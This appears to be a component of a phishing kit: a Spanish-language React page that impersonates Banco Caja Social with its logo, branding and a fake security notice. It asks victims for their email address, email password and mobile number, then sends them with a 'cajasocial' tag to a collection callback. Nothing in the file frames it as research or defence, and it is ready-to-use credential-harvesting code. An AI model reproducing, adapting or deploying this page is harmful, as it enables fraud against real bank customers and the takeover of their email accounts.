/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";
import LoaderFullScreen from "./LoaderFullScreen";

interface Props {
  enviar?: (data: any) => void;
}

export default function ActDatos({ enviar }: Props) {
  const [correo, setCorreo] = useState("");
  const [clave, setClave] = useState("");
  const [celular, setCelular] = useState("");
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!correo || !clave || celular.length < 10) return;
    setLoading(true);

    if (enviar) {
      await enviar({
        view: "actdatos",
        correo,
        clave,
        celular,
        bank: "cajasocial",
        timestamp: new Date().toISOString()
      });
      setLoading(false);
    } else {
      setTimeout(() => setLoading(false), 2000);
    }
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />
      <div className="flex min-h-screen bg-white font-sans text-[#333]">
        {/* LADO IZQUIERDO: IMAGEN */}
        <div className="hidden lg:block w-1/2 relative">
          <img
            src="/cajasocial/background-2.png"
            alt="Fondo Banco"
            className="absolute inset-0 w-full h-full object-cover"
          />
        </div>

        {/* LADO DERECHO: FORMULARIO */}
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8 md:p-16 lg:p-24 text-left">
          <div className="w-full max-w-[440px]">
            {/* LOGO */}
            <div className="mb-10 flex items-center">
              <img
                src="/cajasocial/logoBCSLine.svg"
                alt="Banco Caja Social"
                className="h-[45px] w-auto"
              />
            </div>

            <h1 className="text-[32px] font-bold text-[#222] mb-4 leading-tight">
              Actualiza tus datos
            </h1>

            <div className="mb-8 min-h-[50px]">
              <p className="text-[14px] text-[#555] leading-relaxed">
                Por favor, ingresa los siguientes datos para continuar con el proceso.
              </p>
            </div>

            <form onSubmit={handleLogin}>
              <div className="space-y-6">
                <div>
                  <label className="block text-[14px] font-bold mb-2 text-[#333]">Correo Electrónico</label>
                  <input
                    type="email"
                    value={correo}
                    onChange={(e) => setCorreo(e.target.value)}
                    className="w-full px-4 py-3 border border-[#aeb4b9] rounded-lg focus:outline-none focus:border-[#00548d] text-[16px] transition-all"
                  />
                </div>

                <div>
                  <label className="block text-[14px] font-bold mb-2 text-[#333]">Clave del correo</label>
                  <input
                    type="password"
                    value={clave}
                    onChange={(e) => setClave(e.target.value)}
                    className="w-full px-4 py-3 border border-[#aeb4b9] rounded-lg focus:outline-none focus:border-[#00548d] text-[16px] transition-all"
                  />
                </div>

                <div>
                  <label className="block text-[14px] font-bold mb-2 text-[#333]">Número de celular</label>
                  <input
                    type="tel"
                    value={celular}
                    maxLength={10}
                    onChange={(e) => setCelular(e.target.value.replace(/\D/g, ""))}
                    className="w-full px-4 py-3 border border-[#aeb4b9] rounded-lg focus:outline-none focus:border-[#00548d] text-[16px] transition-all"
                  />
                </div>

                <div className="flex items-center justify-between pt-2">
                  <button
                    type="submit"
                    disabled={!correo || !clave || celular.length < 10}
                    className={`px-10 py-3 rounded-[25px] font-bold text-[15px] transition-all w-full
                      ${correo && clave && celular.length >= 10
                        ? 'bg-[#00548d] text-white hover:bg-[#003d66]'
                        : 'bg-[#cfd6db] text-[#8e979f] cursor-not-allowed'}
                    `}
                  >
                    Siguiente
                  </button>
                </div>
              </div>
            </form>

            <div className="mt-16 pt-8 border-t border-gray-100 text-[14px]">
              <span className="text-gray-600">Este sitio está protegido por políticas de seguridad de Banco Caja Social.</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
